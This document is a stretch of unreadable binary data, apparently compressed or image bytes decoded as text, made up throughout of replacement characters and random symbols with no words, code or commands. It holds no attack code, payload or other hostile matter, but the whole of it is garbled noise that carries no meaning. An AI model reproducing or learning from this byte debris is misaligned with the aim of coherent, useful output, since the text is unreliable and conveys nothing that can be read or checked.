�I$�D�I I$����u�k{�˙�5A�-�qA%TH�{g���? �|��s`ci��7i�&��a,^=���L���z���uiᡞ�Z�;�{W*���u&%a��㏁�U�n7��V4��!"�C[6���1d!�3���FɕL&1,~�#p8�x]���d�rI��$fq����Bνe�t��3�c��OI"�Sc���x���Hh�I$��b��ՇT��&�7��h�x��^�S�Zm+�� kCZ 
�r����Uطr�?b��j�:���� ���Z$�Z�Ы�V�o ��b�fh��|ѕ��.Jl�HKN֪:JX��TA��7�;j�] hq#(M�A�ѷKke���憪|y�l1��W!��P�N�X�pK[�� t�lP5�L�/�}�}N��� �Q���{�M�\e�ɖ9j+X��]�	���8������j�_*S�8��s�I���dNS*�3A�sHF���w����}T�-��uŜ���|��L2�\8Y6	I.�Ϳ�G>}�6|���'�SI�2���N@mέ(�,��/�)����Ǳ�hP��ZJ��3��N�M8r������dMp޲��S�|��t�
� ����v��IQ3)�D�l����+��8ۆ��W�v�Z�HC7��0���&M�P�SJ��⨫�b��G��e�Ġ&�`~ē�9ڒ�_<����z����d�iq޲]1>e}3�y퇕���l	���|�z[y�G�����/*jW�^e�M5�.�W��8����5јu0���e����4C#	n�9��Ĵ��И��Qe��.q�뭌5��\lM�����s?�r�"�	��������#���R�xع��D�$��I I$�I$��1�sC���]���� ��9"��Q��L`�"�C�+Yu�q�	zr�ؤ�4��x�S�t����\~q���v7���{��ǰ�n�S��L�s�OP���U-$�9�{M�<U�x�3�~�7��6If���$s����ۏ���,
}��Hd� ĩ�R>6=�7��,n0� ���q� ��Q��ɮ���A�r��I$�$�7]܉��;�0� ;���<W#�^b�٣�(�Tq�&�X-dsrr�Gbc"��`��ˎH+�ɓ�U�f�0��~��*�C�_�1���?.�d�e)�@��Z[�a�����جW�� us�w@i�jj��n�]��X�G�����؄���$D��̭�ճ*�'^8����u�ŝ|K��J�R8��*����+ت/P��B��e��~�V�俓�ɩ�:�IZ�.�@I�I*�8P��m����.m�����O|]�薍u`�G6N�\U�#M�t2D;�\sB�Bf���H;Lw�����{�j8�)����SU���k��H�er`��$.sH�P&/���y<�W��<%�m�$�Y$lh%����9���OK*�+gQ��t�ݒ��������[���3[h����5�����mEEM�_�倮7�y�Z��;��V{K���*(<������<��
�,��F�@�'XL����h�7������U#���wOR�`��g��9��m$�g2��S�ț�cC@����hJ�7\N��X��n�I �$�HI$�I$�$HL�H��H��4\��؎-=vf�8�N��s喙�q�]/mY�X��-a��,�N-QV�*��v�ҭ�I�!�#ŗ�qJ�4o�+Nak�B��	e>h�'�����.﹃`���C�]T� ��K���ԃz+�wo�B��$c��b-4�fV�xn��a��(ݵ�]�agꙟ�T������p��`d�,x��-���:�:��.~(�K�kd�� ��mD��\���s�yGW/���E�=�3;ڣ�aE��8�1�IS#��'i�Ɨ 8� �*���w�.� ��@�}K�����Ԣ������v0ִ1��'�m�W#���N�t�e� ZD�ST�6#7���]\��iQU<��JKK�GMH��75]��@ ֱ�45�b{M�����9�1@�x)7!��121��B��V�M�:Y���<>i��ک12����uޏ�� �zVt��k���(�YlS�Qߕi��,�+�*4�X����o ��{�%Qɟ��rjEN��и��D�I*�nWV<�q�}u*}��)�|�|O%"�Ҥp����IFv��)�bs*��'���M[/,O\r�Ttm�M]�;�vy�J|Rf�=����x�����Q��$��%\���*�V����Iy�q��Ի̞K�#pV��pX��r��u����-V� 6Ք�Q��4��.�� 2�K1T�KZ.JѸ�n
��6&	�X����t��i�#hh殆�Cb�`n�&(�*���@^�g�#O"�+���lؑ6Ҟ,��v���&�	��)��R�5���\h/��1��l� eJpڕ��ؚ��뤚�6 I$�$�I �/t����]&��5#�n�&��N&��&�Y��Ǎ�����c���&1naic��Bț�clx7&*?3����	�j�q���;��+\��	��&�1)av��O��	ovV����%m7�!�(p͵{�} V�@S��I>���ZK��n��U�l��ITt�6����vX��l[����T�{ͤx�XWGp׊��m ��Zy��gK+���rI[^���dul��3#��vS&��Ӊ �R9�v�T���6.s�c��j�F�ZIX��/c���b�����9���� ���5�δ��b��US�g9r���<����D���.�мoĪ1Z��T���;�4-gA1��?�N��(���ԕ�6$���X>
� ��;�
(�j%��r6<��ɗ�+�-�#���@��飵���Q6�{��i�+T�f߂�S��0�xf�Ꜣ$���v���u5�t=�.)ccE��s��  &�S�q�;-��v�a��%\�&3.z���Yhh���!�QW^}`"N���a��#-�l�N�Tx�@�������pK�p<�\�?'��ٳ���nK�Ԓ=�]LO	@K�q%D�����Sbb���&U;͆�n�n*`, �P�����j�rjOA#��`~�78�ˢ��(���6�ڲ2�A|Н�H߱Rb��F� զ��.O��2�Ɍ�3i��5��m�^��&��g,Hv9ok���\�X�]n���]�l��sZ�+յe�6�sZ\&f4f	�Ѱ��M��K�{��� ��S9�h��EPD$t�6c�:���.�禩��{SC�����j�O8��|�wtvZ6���\*e�x,��h��m`���5�dq�eo� �)��9ؚXL���^�qqS �p�o���4�V	$����H�MA���R7;�"�n��%d-��XqU�x��Z}��D�&6��1SF[�f����8���i�l�9�w�r���S
�Fh�n��Ǐ �����i#\q��g�{��hmbU(-�5߉��^e/��i�-����6Jiv��]�9v��5�c�k`N��;��nPP����� �EF��k�����TT5�X@2?S�ӗN\�F��ä���x�cM�Ejn���h�W&jٰ�(i_$��1������8�ʪ���'\25��M�Z�f��P�F;��C�ߙۇ�d�Wc�ɷG��D�銎��y��qS260݌�m ��s���;5���s�� �V8~�������>���	�� ù�i\��_1��_j���d$�%��<�tS��'TȚ眶�G�l��f�y��'Hۥ��B�����_�]_ǹ��\�[��\��T�D�� 6���V��_CWtB�Y���կ�V�e�ݏ�龩 \I!�"A]!��w�v7�g ��[cG�_b��MM�����Bp㋣b�J�W���?��#R���>�^����~/T�N�q�J���C����U��Z�U�!x�����*�i�C�ƪ�������h^-u�e�I1h��z��X�n>	�VP���3cq�Y�T�C�k��<¸俵=$�A�I�+��\I �V樈|7w�������_}�k���MI$ uO0�A+v�?urr�R�s5Tb�p� ���Ȭ*�3d�Q��-��xlA��Kt))k��H6�{I/*�v���OJZ�A�f\œi�=Q˳�a1�&��$�nP��5�/Q��r�8�u�׬���4���*֔�OL�4����߾NhmN�ڭ.���.���t�z&�H��S��ٴn����J#;��]\������vo�n(�� ;�[��X��@n�e�-��Lp�]C������#��R���%���}%UmS�·�!���xnF���.��qu0��KG+�,5ŵm�Q��U`������'�'�R�D#,O�w��%h[��A�ؕ�K�2t�6���M�]�j� �JGGd�Q��NF�x�{I=T�v�y��J��k��4v����..��|ۣs��Gta��N�Y:m�b��hkE��Q9���*ܪHuŝ�a��⨱_��o�_*c��Ϳt��a{I+C���PZS��j0i"��p��G��jۻ���Ϗ�ݞ�7Z�Y_��q�U�ý�ي�`� �p�S�)W7$�xjɝY"�iNXǏJq����������6�U,T�q��m�k��VG��p
�76� E��=�^K!� �*�6�i�ex�XjH$�cl�*�����l�u�����cp�$�9����-}H�u8����g��;�c����zPد	�����ef��y�y{��8.�8��"�i��^����>WI�N��-c
����� f1��.WN뮌
$��&G����_���9ڰ]����f&XInն�
��뙣�ps��[D��B����m�z����-�c�&k[���1��/��� %W�P�$��ښ̔�C�
}g'���=L����� ���htp��,��͖�g���wr�� ���{,�,��㒺��㢕�c�w�=G���[�
#�e/�tN��?t%\bJ@і9@{>�M�8���ws���m�~V(sru�4�N��H$��䪡�$���D���k�����DM�4��|J�I���	�[4U�=��%	M!�����0Q���?)U�%��兞W�Ӈ-e��Hc�����QP�Ϥaq��'�o���